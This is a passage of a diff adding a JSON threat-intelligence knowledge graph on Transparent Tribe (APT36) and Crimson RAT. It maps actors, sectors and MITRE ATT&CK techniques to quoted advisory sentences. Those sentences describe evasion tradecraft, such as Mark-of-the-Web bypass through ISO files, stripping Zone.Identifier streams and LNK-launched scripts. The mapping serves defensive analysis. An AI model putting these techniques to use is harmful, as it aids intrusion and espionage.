@@ -1,0 +1,1578 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_001424583ef1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "India",
+        "edges": [],
+        "source": {
+          "India_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ],
+            [
+              2,
+              "The group is now actively pursuing startups and technology professionals operating in cybersecurity, technology development, and intelligence-adjacent domains, likely viewing these emerging organizations as indirect pathways to sensitive government information, strategic business intelligence, and insights into India’s growing technology capabilities."
+            ],
+            [
+              10,
+              "Transparent Tribe has strategically expanded its long-standing cyber-espionage operations beyond traditional government, military, and defense-related targets to actively pursue India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "India_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              3,
+              "This shift marks a move beyond the group’s long-standing emphasis on government and defense targets into India’s private-sector startup landscape."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_316692d823b4",
+          "EDGE_85f03ccca4ab"
+        ],
+        "source": {
+          "PowerShell_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              7,
+              "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+            ],
+            [
+              27,
+              "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_37d5f6714279",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Pakistan",
+        "edges": [],
+        "source": {
+          "Pakistan_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ],
+            [
+              37,
+              "While the specific lure themes and target victim profiles have evolved to focus on the startup ecosystem, the underlying strategic motivation remains intelligence collection in support of Pakistani national security objectives rather than financially motivated cybercrime."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_39b1b6a1ac26",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "GymRAT",
+        "edges": [],
+        "source": {
+          "GymRAT_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              36,
+              "The command-and-control infrastructure overlaps with previously identified Transparent Tribe campaigns including operations deploying the GymRAT implant against Indian government agencies."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [
+          "EDGE_a2dd9b2960eb"
+        ],
+        "source": {
+          "Windows_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              4,
+              "ISO files provide significant operational advantages for attackers including bypassing Windows Mark-of-the-Web (MotW) security controls that normally flag downloaded files as potentially dangerous, appearing as legitimate software distributions or documentation packages, and containing multiple file components in a single convenient package."
+            ],
+            [
+              5,
+              "When victims mount these ISO files, Windows automatically assigns them a drive letter and treats the contents as trusted local files, effectively circumventing security warnings that would normally be displayed for downloaded executable content."
+            ],
+            [
+              7,
+              "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+            ],
+            [
+              18,
+              "ISO files bypass Windows Mark-of-the-Web security controls because files extracted from mounted ISOs do not inherit the untrusted zone identifier that triggers security warnings."
+            ],
+            [
+              21,
+              "When victims download and mount the malicious ISO files provided by Transparent Tribe, Windows automatically assigns a drive letter to the virtual disk and makes the contents accessible through Windows Explorer."
+            ],
+            [
+              23,
+              "Critically, the mounting operation causes Windows to treat the ISO contents as local trusted files rather than downloaded internet content, effectively bypassing Mark-of-the-Web (MotW) protections that would normally flag executable content from untrusted sources."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_56f80800a4d1",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Crimson RAT",
+        "edges": [
+          "EDGE_1247aa8bb73b",
+          "EDGE_dfc42d7fd169",
+          "EDGE_4ecdbea703a1",
+          "EDGE_58f4b596918e",
+          "EDGE_e624493e1dc0",
+          "EDGE_197c548afe22",
+          "EDGE_1e51f6ff14ab",
+          "EDGE_295c126401b4",
+          "EDGE_c368d05ec39a",
+          "EDGE_d149b537e243",
+          "EDGE_f0af3c9e7a9f"
+        ],
+        "source": {
+          "Crimson RAT_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              9,
+              "The final payload is Crimson RAT, a well-established remote access trojan consistently associated with Transparent Tribe operations."
+            ],
+            [
+              28,
+              "The ultimate payload delivered through this attack chain is Crimson RAT, a sophisticated remote access trojan that has been consistently associated with Transparent Tribe operations for several years."
+            ],
+            [
+              29,
+              "Crimson RAT implements multiple anti-analysis and evasion techniques designed to complicate security research, defeat automated analysis, and avoid detection by security products."
+            ],
+            [
+              31,
+              "Crimson RAT utilizes a custom TCP-based command-and-control protocol rather than standard HTTP or HTTPS communications."
+            ],
+            [
+              34,
+              "Once successfully deployed and connected to command-and-control infrastructure, Crimson RAT provides comprehensive post-exploitation capabilities."
+            ]
+          ],
+          "Crimson RAT_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              2,
+              "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system."
+            ],
+            [
+              4,
+              "The Acronis Threat Research Unit analyzed the ISO payload, embedded LNK shortcut, batch execution logic, and the resulting Crimson RAT implant."
+            ]
+          ],
+          "Crimson RAT_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              0,
+              "In 2016, the Crimson remote-access trojan (RAT) made headlines when it was found to be used against Indian diplomatic and military resources in an advanced persistent threat (APT) attack called “Operation Transparent Tribe.”\nSince then, Crimson RAT has been favored by threat actors for targeted attacks on organizations in the financial, healthcare, and space technology sectors."
+            ],
+            [
+              1,
+              "A recent blog post described how the APT36 group used the coronavirus outbreak to lure users into opening a fake health advisory which, upon execution, infected their devices with the Crimson RAT."
+            ],
+            [
+              7,
+              "The ZIP payload is dropped at C:\\ProgramData\\Bhoithas\\dhdxcia.zip, after which the ZIP file is extracted in the same directory with the name brwmarivas.exe, and then it's executed, which results in the Crimson RAT."
+            ],
+            [
+              13,
+              "Based on the OS version of the victim's system, it drops a Crimson RAT payload at C:\\ProgramData\\Hblondas\\rihndimrva.exe and executes it."
+            ],
+            [
+              15,
+              "Crimson RAT has the functionality to exfiltrate files and system data and transfer it over non-web channels to its command-and-control (C&C) server."
+            ],
+            [
+              25,
+              "In this case, an Indian financial institution was targeted with a spear-phishing email containing a malicious DOC file or malicious executable, and the payload dropped in the attack was Crimson RAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9728b1ff28eb",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Transparent Tribe",
+        "edges": [
+          "EDGE_2f5eeee5e742",
+          "EDGE_36dd8a6f273e",
+          "EDGE_4e528cab6bf3",
+          "EDGE_59354ac25277",
+          "EDGE_a553db3194aa",
+          "EDGE_c3206b82c8ee"
+        ],
+        "source": {
+          "Transparent Tribe_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ],
+            [
+              9,
+              "The final payload is Crimson RAT, a well-established remote access trojan consistently associated with Transparent Tribe operations."
+            ],
+            [
+              10,
+              "Transparent Tribe has strategically expanded its long-standing cyber-espionage operations beyond traditional government, military, and defense-related targets to actively pursue India’s rapidly growing startup ecosystem."
+            ],
+            [
+              13,
+              "The Transparent Tribe campaign relies fundamentally on sophisticated social engineering tactics that demonstrate extensive pre-operational reconnaissance of target organizations and individuals."
+            ],
+            [
+              21,
+              "When victims download and mount the malicious ISO files provided by Transparent Tribe, Windows automatically assigns a drive letter to the virtual disk and makes the contents accessible through Windows Explorer."
+            ],
+            [
+              28,
+              "The ultimate payload delivered through this attack chain is Crimson RAT, a sophisticated remote access trojan that has been consistently associated with Transparent Tribe operations for several years."
+            ],
+            [
+              35,
+              "Infrastructure reuse analysis, malware code similarities, consistent victimology patterns, and operational tradecraft allow this campaign to be attributed to Transparent Tribe with high confidence."
+            ],
+            [
+              36,
+              "The command-and-control infrastructure overlaps with previously identified Transparent Tribe campaigns including operations deploying the GymRAT implant against Indian government agencies."
+            ]
+          ],
+          "Transparent Tribe_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              0,
+              "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services."
+            ]
+          ],
+          "APT36_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "APT36_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              0,
+              "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services."
+            ],
+            [
+              6,
+              "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses."
+            ]
+          ],
+          "APT36_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              1,
+              "A recent blog post described how the APT36 group used the coronavirus outbreak to lure users into opening a fake health advisory which, upon execution, infected their devices with the Crimson RAT."
+            ]
+          ],
+          "Earth Karkaddan_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "Mythic Leopard_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "ProjectM_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "TEMP.Lapis_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ],
+          "Copper Fieldstone_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              0,
+              "Transparent Tribe (also tracked as APT36, ProjectM, Mythic Leopard, TEMP.Lapis, Copper Fieldstone, Earth Karkaddan, and numerous other aliases), a well-established Pakistan-aligned advanced persistent threat group, has significantly expanded its cyber-espionage operations in February 2026 by targeting India’s rapidly growing startup ecosystem."
+            ]
+          ]
+        },
+        "alias": [
+          "APT36",
+          "Earth Karkaddan",
+          "Mythic Leopard",
+          "ProjectM",
+          "TEMP.Lapis",
+          "Copper Fieldstone"
+        ]
+      },
+      {
+        "node_id": "HL_9e9d59dfb164",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "SmartScreen",
+        "edges": [
+          "EDGE_63053cc02dba"
+        ],
+        "source": {
+          "SmartScreen_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              8,
+              "By stripping these markers, the malware effectively suppresses SmartScreen warnings and other security prompts that would normally alert users to potentially dangerous file execution."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f2462203932d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Acronis Threat Research Unit",
+        "edges": [],
+        "source": {
+          "Acronis Threat Research Unit_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              4,
+              "The Acronis Threat Research Unit analyzed the ISO payload, embedded LNK shortcut, batch execution logic, and the resulting Crimson RAT implant."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2568a062c5d7",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "Operation Transparent Tribe",
+        "edges": [],
+        "source": {
+          "Operation Transparent Tribe_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              0,
+              "In 2016, the Crimson remote-access trojan (RAT) made headlines when it was found to be used against Indian diplomatic and military resources in an advanced persistent threat (APT) attack called “Operation Transparent Tribe.”\nSince then, Crimson RAT has been favored by threat actors for targeted attacks on organizations in the financial, healthcare, and space technology sectors."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_7467e14989a1",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "Indian financial institutions",
+        "edges": [],
+        "source": {
+          "Indian financial institutions_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              2,
+              "The Zscaler ThreatLabZ team observed similar tactics in our logs affecting Indian financial institutions."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8c420ebe720a",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "healthcare",
+        "edges": [],
+        "source": {
+          "healthcare_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              0,
+              "In 2016, the Crimson remote-access trojan (RAT) made headlines when it was found to be used against Indian diplomatic and military resources in an advanced persistent threat (APT) attack called “Operation Transparent Tribe.”\nSince then, Crimson RAT has been favored by threat actors for targeted attacks on organizations in the financial, healthcare, and space technology sectors."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8e1659bea8b4",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Zscaler ThreatLabZ",
+        "edges": [],
+        "source": {
+          "Zscaler ThreatLabZ_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              2,
+              "The Zscaler ThreatLabZ team observed similar tactics in our logs affecting Indian financial institutions."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_91807a6015b9",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "Campaign 1",
+        "edges": [
+          "EDGE_a1e45a2f761e",
+          "EDGE_b4e66f0cd039"
+        ],
+        "source": {
+          "Campaign 1_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              4,
+              "Campaign 1 starts with a phishing email containing a link to a malicious PE (executable) file."
+            ],
+            [
+              12,
+              "Similar to Campaign 1, two PE files are stored in the value of Textboxes of UserForm1."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b9d4a3ae4382",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "Campaign 2",
+        "edges": [
+          "EDGE_e58024991604",
+          "EDGE_e693abc2f3e1"
+        ],
+        "source": {
+          "Campaign 2_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              9,
+              "Campaign 2 starts with a spear-phishing email containing a DOC file as the attachment."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d3c367bec7bf",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "space technology",
+        "edges": [],
+        "source": {
+          "space technology_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              0,
+              "In 2016, the Crimson remote-access trojan (RAT) made headlines when it was found to be used against Indian diplomatic and military resources in an advanced persistent threat (APT) attack called “Operation Transparent Tribe.”\nSince then, Crimson RAT has been favored by threat actors for targeted attacks on organizations in the financial, healthcare, and space technology sectors."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e70a4402f0fb",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "financial, healthcare, and space technology sectors",
+        "edges": [],
+        "source": {
+          "financial, healthcare, and space technology sectors_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              0,
+              "In 2016, the Crimson remote-access trojan (RAT) made headlines when it was found to be used against Indian diplomatic and military resources in an advanced persistent threat (APT) attack called “Operation Transparent Tribe.”\nSince then, Crimson RAT has been favored by threat actors for targeted attacks on organizations in the financial, healthcare, and space technology sectors."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1023",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1023",
+        "ttp_id": "T1023",
+        "best_span_sentences_list": [
+          [
+            "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            27
+          ]
+        ],
+        "edges": [
+          "EDGE_2f5eeee5e742"
+        ],
+        "source": {
+          "TTP:T1023_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "ISO files can contain multiple components including legitimate-appearing decoy documents, malicious LNK shortcuts, batch scripts, and executable payloads in a single convenient package."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_c3206b82c8ee"
+        ],
+        "source": {
+          "TTP:T1036_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "ISO files can contain multiple components including legitimate-appearing decoy documents, malicious LNK shortcuts, batch scripts, and executable payloads in a single convenient package."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+          ],
+          [
+            "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_36dd8a6f273e"
+        ],
+        "source": {
+          "TTP:T1059_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ],
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+              ],
+              [
+                "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1095",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1095",
+        "ttp_id": "T1095",
+        "best_span_sentences_list": [
+          [
+            "Crimson RAT utilizes a custom TCP-based command-and-control protocol rather than standard HTTP or HTTPS communications."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            31,
+            31
+          ]
+        ],
+        "edges": [
+          "EDGE_1247aa8bb73b"
+        ],
+        "source": {
+          "TTP:T1095_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                31,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Crimson RAT utilizes a custom TCP-based command-and-control protocol rather than standard HTTP or HTTPS communications."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "Inside the malicious ISO containers, victims encounter LNK shortcut files or staged executable files designed to initiate the infection chain with minimal additional user interaction."
+          ],
+          [
+            "ISO files can contain multiple components including legitimate-appearing decoy documents, malicious LNK shortcuts, batch scripts, and executable payloads in a single convenient package."
+          ],
+          [
+            "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ],
+          [
+            20,
+            20
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "edges": [
+          "EDGE_4e528cab6bf3",
+          "EDGE_85f03ccca4ab",
+          "EDGE_58f4b596918e",
+          "EDGE_8a08ff682f7a",
+          "EDGE_a1e45a2f761e",
+          "EDGE_b870ab3b1a08",
+          "EDGE_e693abc2f3e1"
+        ],
+        "source": {
+          "TTP:T1204_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                6,
+                6
+              ],
+              [
+                20,
+                20
+              ],
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Inside the malicious ISO containers, victims encounter LNK shortcut files or staged executable files designed to initiate the infection chain with minimal additional user interaction."
+              ],
+              [
+                "ISO files can contain multiple components including legitimate-appearing decoy documents, malicious LNK shortcuts, batch scripts, and executable payloads in a single convenient package."
+              ],
+              [
+                "When the victim double-clicks what they believe is a document or installer, the LNK shortcut instead executes a malicious batch script or PowerShell command embedded in the shortcut target field."
+              ]
+            ]
+          },
+          "TTP:T1204_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The infection chain delivers a malicious ISO that contains a LNK shortcut.",
+                "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system."
+              ]
+            ]
+          },
+          "TTP:T1204_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                8,
+                8
+              ],
+              [
+                11,
+                11
+              ],
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A recent blog post described how the APT36 group used the coronavirus outbreak to lure users into opening a fake health advisory which, upon execution, infected their devices with the Crimson RAT."
+              ],
+              [
+                "After the RAT payload is executed, it drops the CV document in the “Document” directory with the name sonam karwati_01.docx and then executes this file."
+              ],
+              [
+                "Opening the DOC file shows a blank page but, after enabling the macro, it executes the RAT payload and loads the clean Resume/CV file."
+              ],
+              [
+                "In this case, an Indian financial institution was targeted with a spear-phishing email containing a malicious DOC file or malicious executable, and the payload dropped in the attack was Crimson RAT."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1219",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1219",
+        "ttp_id": "T1219",
+        "best_span_sentences_list": [
+          [
+            "The final payload is Crimson RAT, a well-established remote access trojan consistently associated with Transparent Tribe operations."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            9,
+            9
+          ]
+        ],
+        "edges": [
+          "EDGE_a553db3194aa",
+          "EDGE_dfc42d7fd169"
+        ],
+        "source": {
+          "TTP:T1219_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                9,
+                9
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The final payload is Crimson RAT, a well-established remote access trojan consistently associated with Transparent Tribe operations."
+              ]
+            ]
+          },
+          "TTP:T1219_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The infection chain delivers a malicious ISO that contains a LNK shortcut.",
+                "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1553",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1553",
+        "ttp_id": "T1553",
+        "best_span_sentences_list": [
+          [
+            "ISO files provide significant operational advantages for attackers including bypassing Windows Mark-of-the-Web (MotW) security controls that normally flag downloaded files as potentially dangerous, appearing as legitimate software distributions or documentation packages, and containing multiple file components in a single convenient package."
+          ],
+          [
+            "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+          ],
+          [
+            "ISO files bypass Windows Mark-of-the-Web security controls because files extracted from mounted ISOs do not inherit the untrusted zone identifier that triggers security warnings."
+          ],
+          [
+            "Critically, the mounting operation causes Windows to treat the ISO contents as local trusted files rather than downloaded internet content, effectively bypassing Mark-of-the-Web (MotW) protections that would normally flag executable content from untrusted sources."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ],
+          [
+            7,
+            7
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            23,
+            23
+          ]
+        ],
+        "edges": [
+          "EDGE_316692d823b4",
+          "EDGE_63053cc02dba",
+          "EDGE_a2dd9b2960eb"
+        ],
+        "source": {
+          "TTP:T1553_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                4,
+                4
+              ],
+              [
+                7,
+                7
+              ],
+              [
+                18,
+                18
+              ],
+              [
+                23,
+                23
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "ISO files provide significant operational advantages for attackers including bypassing Windows Mark-of-the-Web (MotW) security controls that normally flag downloaded files as potentially dangerous, appearing as legitimate software distributions or documentation packages, and containing multiple file components in a single convenient package."
+              ],
+              [
+                "Batch scripts embedded in the attack chain leverage PowerShell commands to programmatically remove Zone.Identifier alternate data streams that Windows uses to track file origins."
+              ],
+              [
+                "ISO files bypass Windows Mark-of-the-Web security controls because files extracted from mounted ISOs do not inherit the untrusted zone identifier that triggers security warnings."
+              ],
+              [
+                "Critically, the mounting operation causes Windows to treat the ISO contents as local trusted files rather than downloaded internet content, effectively bypassing Mark-of-the-Web (MotW) protections that would normally flag executable content from untrusted sources."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "The technical delivery mechanism leverages malicious ISO container files distributed via phishing emails or malicious links."
+          ],
+          [
+            "The Transparent Tribe campaign relies fundamentally on sophisticated social engineering tactics that demonstrate extensive pre-operational reconnaissance of target organizations and individuals.",
+            "The threat actors craft phishing lures specifically tailored to the interests, responsibilities, and business priorities of startup founders, executives, and technical personnel.",
